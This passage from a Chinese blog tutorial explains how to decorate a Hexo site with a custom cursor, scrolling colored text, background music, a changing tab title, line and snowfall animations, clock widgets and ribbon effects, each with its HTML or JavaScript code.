这个软件自己制作，不同主题具体放的文件有所不同，确保在博客主体 body 的 CSS 文件中即可，其中的鼠标指针链接可替换成自己的，首先尝试加载<a href="https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur">https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur</a> ，如果该文件不存在或由于其他原因无效，那么 auto 会被使用，也就是自动默认效果，图片格式为.ico、.ani、.cur，建议使用.cur，如果使用.ani或者其他格式无效，原因是浏览器兼容问题，请阅读<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Basic_User_Interface/Using_URL_values_for_the_cursor_property">参考文档</a>。</p><h3 id="6-添加彩色滚动变换字体"><a href="#6-添加彩色滚动变换字体" class="headerlink" title="6.添加彩色滚动变换字体"></a>6.添加彩色滚动变换字体</h3><p>在你想要添加彩色滚动变换字体的地方写入以下代码即可，其中文字可自行更改：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;binft&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> binft = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> b[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * b.length)]</span><br>      &#125;  <br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">94</span> * <span class="hljs-built_in">Math</span>.random() + <span class="hljs-number">33</span>)</span><br>      &#125;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-built_in">document</span>.createDocumentFragment(), i = <span class="hljs-number">0</span>; r &gt; i; i++) &#123;</span><br><span class="javascript">          <span class="hljs-keyword">var</span> l = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;span&quot;</span>);</span><br>          l.textContent = e(), l.style.color = t(), n.appendChild(l)<br>        &#125;<br><span class="javascript">        <span class="hljs-keyword">return</span> n</span><br>      &#125;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">var</span> t = o[c.skillI];</span><br><span class="javascript">        c.step ? c.step-- : (c.step = g, c.prefixP &lt; l.length ? (c.prefixP &gt;= <span class="hljs-number">0</span> &amp;&amp; (c.text += l[c.prefixP]), c.prefixP++) : <span class="hljs-string">&quot;forward&quot;</span> === c.direction ? c.skillP &lt; t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = <span class="hljs-string">&quot;backward&quot;</span>, c.delay = a) : c.skillP &gt; <span class="hljs-number">0</span> ? (c.text = c.text.slice(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), c.skillP--) : (c.skillI = (c.skillI + <span class="hljs-number">1</span>) % o.length, c.direction = <span class="hljs-string">&quot;forward&quot;</span>)), r.textContent = c.text, r.appendChild(n(c.prefixP &lt; l.length ? <span class="hljs-built_in">Math</span>.min(s, s + c.prefixP) : <span class="hljs-built_in">Math</span>.min(s, t.length - c.skillP))), <span class="hljs-built_in">setTimeout</span>(i, d)</span><br>      &#125;<br><span class="javascript">      <span class="hljs-keyword">var</span> l = <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="javascript">      o = [<span class="hljs-string">&quot;青青陵上柏，磊磊涧中石。&quot;</span>, <span class="hljs-string">&quot;人生天地间，忽如远行客。&quot;</span>,<span class="hljs-string">&quot;斗酒相娱乐，聊厚不为薄。&quot;</span>, <span class="hljs-string">&quot;驱车策驽马，游戏宛与洛。&quot;</span>,<span class="hljs-string">&quot;洛中何郁郁，冠带自相索。&quot;</span>,<span class="hljs-string">&quot;长衢罗夹巷，王侯多第宅。&quot;</span>,<span class="hljs-string">&quot;两宫遥相望，双阙百余尺。&quot;</span>,<span class="hljs-string">&quot;极宴娱心意，戚戚何所迫？&quot;</span>].map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">r</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">return</span> r + <span class="hljs-string">&quot;&quot;</span></span><br>      &#125;),<br>      a = 2,<br>      g = 1,<br>      s = 5,<br>      d = 75,<br><span class="javascript">      b = [<span class="hljs-string">&quot;rgb(110,64,170)&quot;</span>, <span class="hljs-string">&quot;rgb(150,61,179)&quot;</span>, <span class="hljs-string">&quot;rgb(191,60,175)&quot;</span>, <span class="hljs-string">&quot;rgb(228,65,157)&quot;</span>, <span class="hljs-string">&quot;rgb(254,75,131)&quot;</span>, <span class="hljs-string">&quot;rgb(255,94,99)&quot;</span>, <span class="hljs-string">&quot;rgb(255,120,71)&quot;</span>, <span class="hljs-string">&quot;rgb(251,150,51)&quot;</span>, <span class="hljs-string">&quot;rgb(226,183,47)&quot;</span>, <span class="hljs-string">&quot;rgb(198,214,60)&quot;</span>, <span class="hljs-string">&quot;rgb(175,240,91)&quot;</span>, <span class="hljs-string">&quot;rgb(127,246,88)&quot;</span>, <span class="hljs-string">&quot;rgb(82,246,103)&quot;</span>, <span class="hljs-string">&quot;rgb(48,239,130)&quot;</span>, <span class="hljs-string">&quot;rgb(29,223,163)&quot;</span>, <span class="hljs-string">&quot;rgb(26,199,194)&quot;</span>, <span class="hljs-string">&quot;rgb(35,171,216)&quot;</span>, <span class="hljs-string">&quot;rgb(54,140,225)&quot;</span>, <span class="hljs-string">&quot;rgb(76,110,219)&quot;</span>, <span class="hljs-string">&quot;rgb(96,84,200)&quot;</span>],</span><br>      c = &#123;<br><span class="javascript">        text: <span class="hljs-string">&quot;&quot;</span>,</span><br>        prefixP: -s,<br>        skillI: 0,<br>        skillP: 0,<br><span class="javascript">        direction: <span class="hljs-string">&quot;forward&quot;</span>,</span><br>        delay: a,<br>        step: g<br>      &#125;;<br>      i()<br>      &#125;;<br><span class="javascript">      binft(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;binft&#x27;</span>));</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="7-添加背景音乐"><a href="#7-添加背景音乐" class="headerlink" title="7.添加背景音乐"></a>7.添加背景音乐</h3><p>打开网页版网易云音乐，选择你准备添加的背景音乐，点击生成外链播放器，前提是要有版权，不然是无法生成外链播放器的，复制底下的HTML代码.然后将此代码放到你想要放的地方，比如放在博客的左侧，则打开 \themes\hexo-theme-spfk\layout_partial\left-col.ejs 文件，将复制的HTML代码粘贴进去，再进行适当的位置设置让播放器更美观，其中 auto=1 表示打开网页自动播放音乐，auto=0 表示关闭自动播放音乐.<br>这种网易云音乐外链的方式有很多局限性，因此推荐使用aplayer，GitHub地址为：<a href="https://github.com/MoePlayer/APlayer">https://github.com/MoePlayer/APlayer</a> </p><h3 id="8-浏览器网页标题动态改变"><a href="#8-浏览器网页标题动态改变" class="headerlink" title="8.浏览器网页标题动态改变"></a>8.浏览器网页标题动态改变</h3><p>当用户访问你的博客时点击到了其他网页，我们可以改变一下网页标题，呼唤用户回来，首先在目录 \themes\material-x\source\js 下新建一个 FunnyTitle.js 文件，在里面填写如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">// 浏览器标题<br>var OriginTitle = document.title;<br>var titleTime;<br>document.addEventListener(&#x27;visibilitychange&#x27;, function () &#123;<br>    if (document.hidden) &#123;<br>        $(&#x27;[rel=&quot;icon&quot;]&#x27;).attr(&#x27;href&#x27;, &quot;/funny.ico&quot;);<br>        document.title = &#x27;╭(°A°`)╮ 页面崩溃啦 ~&#x27;;<br>        clearTimeout(titleTime);<br>    &#125;<br>    else &#123;<br>        $(&#x27;[rel=&quot;icon&quot;]&#x27;).attr(&#x27;href&#x27;, &quot;/favicon.ico&quot;);<br>        document.title = &#x27;(ฅ&gt;ω&lt;*ฅ) 噫又好啦 ~&#x27; + OriginTitle;<br>        titleTime = setTimeout(function () &#123;<br>            document.title = OriginTitle;<br>        &#125;, 2000);<br>    &#125;<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>其中 funny.ico 是用户切换到其他标签后你网站的图标，favicon.ico 是正常图标，然后在 \themes\material-x\layout\layout.ejs 文件中添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--浏览器搞笑标题--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/FunnyTitle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>之后就可以去试试效果了。</p><h3 id="9-背景添加动态线条效果"><a href="#9-背景添加动态线条效果" class="headerlink" title="9.背景添加动态线条效果"></a>9.背景添加动态线条效果</h3><p>在 \Hexo\themes\hexo-theme-spfk\layout\layout.ejs 文件中添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--动态线条背景--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">color</span>=<span class="hljs-string">&quot;220,220,220&quot;</span> <span class="hljs-attr">opacity</span>=<span class="hljs-string">&#x27;0.7&#x27;</span> <span class="hljs-attr">zIndex</span>=<span class="hljs-string">&quot;-2&quot;</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>其中：</p><p>color：表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）<br>opacity：表示线条透明度（0~1），默认：0.5<br>count：表示线条的总数量，默认：150<br>zIndex：表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1</p><p>之后就可以看见效果了。</p><h3 id="10-添加人体时钟等有趣的挂件"><a href="#10-添加人体时钟等有趣的挂件" class="headerlink" title="10.添加人体时钟等有趣的挂件"></a>10.添加人体时钟等有趣的挂件</h3><p>在你的博客上有合适的地方，加上。实现代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--人体时钟背景透明--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;Shift_JIS&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--人体时钟背景白--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;Shift_JIS&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_wh.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>其他网页小挂件推荐：</p><p><a href="http://abowman.com/">http://abowman.com/</a> 里面有很多有趣的小挂件，可以养养鱼、龟、狗、仓鼠等各式各样的虚拟宠物，能根据你的鼠标指针位置移动，直接复制代码就可以用<br><a href="http://www.revolvermaps.com/">http://www.revolvermaps.com/</a> 它提供网站访客地理信息，可以以2D、3D等形式显示<br><a href="http://www.amazingcounters.com/">http://www.amazingcounters.com/</a> 免费网站计数器，有非常多的样式供你选择，可以设置计数器初始数值，可以设置按访问量计数，也可以按独立访问者计数<br><a href="https://www.seniverse.com/widget/get">https://www.seniverse.com/widget/get</a> 心知天气提供基于Web的免费天气插件，可以为你的网站添加一项简洁美观的天气预报功能，并自动适配PC和手机上的浏览</p><h3 id="11-添加网站雪花飘落效果"><a href="#11-添加网站雪花飘落效果" class="headerlink" title="11.添加网站雪花飘落效果"></a>11.添加网站雪花飘落效果</h3><p>有样式一和样式二。<br>样式一是有形状的。样式二是一个模糊点。<br>实现方法：在 \Hexo\themes\hexo-theme-spfk\source\js 目录下新建一个 snow.js 文件，粘贴以下代码：<br>样式一代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">/*样式一*/<br>(function($)&#123;<br>$.fn.snow = function(options)&#123;<br>var $flake = $(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;snowbox&quot;</span> /&gt;</span>&#x27;).css(&#123;&#x27;position&#x27;: &#x27;absolute&#x27;,&#x27;z-index&#x27;:&#x27;9999&#x27;, &#x27;top&#x27;: &#x27;-50px&#x27;&#125;).html(&#x27;<span class="hljs-symbol">&amp;#10052;</span>&#x27;),<br>documentHeight = $(document).height(),<br>documentWidth= $(document).width(),<br>defaults = &#123;<br>minSize: 10,<br>maxSize: 20,<br>newOn: 1000,<br>flakeColor: &quot;#AFDAEF&quot; /* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */<br>&#125;,<br>options= $.extend(&#123;&#125;, defaults, options);<br>var interval= setInterval( function()&#123;<br>var startPositionLeft = Math.random() * documentWidth - 100,<br>startOpacity = 0.5 + Math.random(),<br>sizeFlake = options.minSize + Math.random() * options.maxSize,<br>endPositionTop = documentHeight - 200,<br>endPositionLeft = startPositionLeft - 500 + Math.random() * 500,<br>durationFall = documentHeight * 10 + Math.random() * 5000;<br>$flake.clone().appendTo(&#x27;body&#x27;).css(&#123;<br>left: startPositionLeft,<br>opacity: startOpacity,<br>&#x27;font-size&#x27;: sizeFlake,<br>color: options.flakeColor<br>&#125;).animate(&#123;<br>top: endPositionTop,<br>left: endPositionLeft,<br>opacity: 0.2<br>&#125;,durationFall,&#x27;linear&#x27;,function()&#123;<br>$(this).remove()<br>&#125;);<br>&#125;, options.newOn);<br>    &#125;;<br>&#125;)(jQuery);<br>$(function()&#123;<br>    $.fn.snow(&#123; <br>    minSize: 5, /* 定义雪花最小尺寸 */<br>    maxSize: 50,/* 定义雪花最大尺寸 */<br>    newOn: 300  /* 定义密集程度，数字越小越密集 */<br>    &#125;);<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>样式二代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">/*样式二*/<br>/* 控制下雪 */<br>function snowFall(snow) &#123;<br>    /* 可配置属性 */<br>    snow = snow || &#123;&#125;;<br>    this.maxFlake = snow.maxFlake || 200;   /* 最多片数 */<br>    this.flakeSize = snow.flakeSize || 10;  /* 雪花形状 */<br>    this.fallSpeed = snow.fallSpeed || 1;   /* 坠落速度 */<br>&#125;<br>/* 兼容写法 */<br>requestAnimationFrame = window.requestAnimationFrame ||<br>    window.mozRequestAnimationFrame ||<br>    window.webkitRequestAnimationFrame ||<br>    window.msRequestAnimationFrame ||<br>    window.oRequestAnimationFrame ||<br>    function(callback) &#123; setTimeout(callback, 1000 / 60); &#125;;<br><br>cancelAnimationFrame = window.cancelAnimationFrame ||<br>    window.mozCancelAnimationFrame ||<br>    window.webkitCancelAnimationFrame ||<br>    window.msCancelAnimationFrame ||<br>window.oCancelAnimationFrame;<br>/* 开始下雪 */<br>snowFall.prototype.start = function()&#123;<br>    /* 创建画布 */<br>    snowCanvas.apply(this);<br>    /* 创建雪花形状 */<br>    createFlakes.apply(this);<br>    /* 画雪 */<br>    drawSnow.apply(this)<br>&#125;<br>/* 创建画布 */<br>function snowCanvas() &#123;<br>    /* 添加Dom结点 */<br>    var snowcanvas = document.createElement(&quot;canvas&quot;);<br>    snowcanvas.id = &quot;snowfall&quot;;<br>    snowcanvas.width = window.innerWidth;<br>    snowcanvas.height = document.body.clientHeight;<br>    snowcanvas.setAttribute(&quot;style&quot;, &quot;position:absolute; top: 0; left: 0; z-index: 1; pointer-events: none;&quot;);<br>    document.getElementsByTagName(&quot;body&quot;)[0].appendChild(snowcanvas);<br>    this.canvas = snowcanvas;<br>    this.ctx = snowcanvas.getContext(&quot;2d&quot;);<br>    /* 窗口大小改变的处理 */<br>    window.onresize = function() &#123;<br>        snowcanvas.width = window.innerWidth;<br>        /* snowcanvas.height = window.innerHeight */<br>    &#125;<br>&#125;<br>/* 雪运动对象 */<br>function flakeMove(canvasWidth, canvasHeight, flakeSize, fallSpeed) &#123;<br>    this.x = Math.floor(Math.random() * canvasWidth);   /* x坐标 */<br>    this.y = Math.floor(Math.random() * canvasHeight);  /* y坐标 */<br>    this.size = Math.random() * flakeSize + 2;          /* 形状 */<br>    this.maxSize = flakeSize;                           /* 最大形状 */<br>    this.speed = Math.random() * 1 + fallSpeed;         /* 坠落速度 */<br>    this.fallSpeed = fallSpeed;                         /* 坠落速度 */<br>    this.velY = this.speed;                             /* Y方向速度 */<br>    this.velX = 0;                                      /* X方向速度 */<br>    this.stepSize = Math.random() / 30;                 /* 步长 */<br>    this.step = 0                                       /* 步数 */<br>&#125;<br>flakeMove.prototype.update = function() &#123;<br>    var x = this.x,<br>        y = this.y;<br>    /* 左右摆动(余弦) */<br>    this.velX *= 0.98;<br>    if (this.velY &lt;= this.speed) &#123;<br>        this.velY = this.speed<br>    &#125;<br>    this.velX += Math.cos(this.step += .05) * this.stepSize;<br><br>    this.y += this.velY;<br>    this.x += this.velX;<br>    /* 飞出边界的处理 */<br>    if (this.x &gt;= canvas.width || this.x &lt;= 0 || this.y &gt;= canvas.height || this.y &lt;= 0) &#123;<br>        this.reset(canvas.width, canvas.height)<br>    &#125;<br>&#125;;<br>/* 飞出边界-放置最顶端继续坠落 */<br>flakeMove.prototype.reset = function(width, height) &#123;<br>    this.x = Math.floor(Math.random() * width);<br>    this.y = 0;<br>    this.size = Math.random() * this.maxSize + 2;<br>    this.speed = Math.random() * 1 + this.fallSpeed;<br>    this.velY = this.speed;<br>    this.velX = 0;<br>&#125;;<br>// 渲染雪花-随机形状（此处可修改雪花颜色！！！）<br>flakeMove.prototype.render = function(ctx) &#123;<br>    var snowFlake = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size);<br>    snowFlake.addColorStop(0, &quot;rgba(255, 255, 255, 0.9)&quot;);  /* 此处是雪花颜色，默认是白色 */<br>    snowFlake.addColorStop(.5, &quot;rgba(255, 255, 255, 0.5)&quot;); /* 若要改为其他颜色，请自行查 */<br>    snowFlake.addColorStop(1, &quot;rgba(255, 255, 255, 0)&quot;);    /* 找16进制的RGB 颜色代码。 */<br>    ctx.save();<br>    ctx.fillStyle = snowFlake;<br>    ctx.beginPath();<br>    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);<br>    ctx.fill();<br>    ctx.restore();<br>&#125;;<br>/* 创建雪花-定义形状 */<br>function createFlakes() &#123;<br>    var maxFlake = this.maxFlake,<br>        flakes = this.flakes = [],<br>        canvas = this.canvas;<br>    for (var i = 0; i &lt; maxFlake; i++) &#123;<br>        flakes.push(new flakeMove(canvas.width, canvas.height, this.flakeSize, this.fallSpeed))<br>    &#125;<br>&#125;<br>/* 画雪 */<br>function drawSnow() &#123;<br>    var maxFlake = this.maxFlake,<br>        flakes = this.flakes;<br>    ctx = this.ctx, canvas = this.canvas, that = this;<br>    /* 清空雪花 */<br>    ctx.clearRect(0, 0, canvas.width, canvas.height);<br>    for (var e = 0; e &lt; maxFlake; e++) &#123;<br>        flakes[e].update();<br>        flakes[e].render(ctx);<br>    &#125;<br>    /*  一帧一帧的画 */<br>    this.loop = requestAnimationFrame(function() &#123;<br>        drawSnow.apply(that);<br>    &#125;);<br>&#125;<br>/* 调用及控制方法 */<br>var snow = new snowFall(&#123;maxFlake:60&#125;);<br>snow.start();<br><br></code></pre></div></td></tr></table></figure><p>然后在 \Hexo\themes\hexo-theme-spfk\layout\layout.ejs 文件里引用即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 雪花特效 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\js\snow.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>如果没效果，请确认网页是否已载入JQurey，如果没有请在下雪代码之前引入JQ即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/1.8.3/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="12-添加背景动态彩带效果"><a href="#12-添加背景动态彩带效果" class="headerlink" title="12.添加背景动态彩带效果"></a>12.添加背景动态彩带效果</h3><p>样式一是鼠标点击后彩带自动更换样式，样式二是飘动的彩带.<br>实现方法：在 \themes\material-x\layout\layout.ejs 文件的body前面添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 样式一（鼠标点击更换样式） --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://g.joyinshare.com/hc/ribbon.min.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 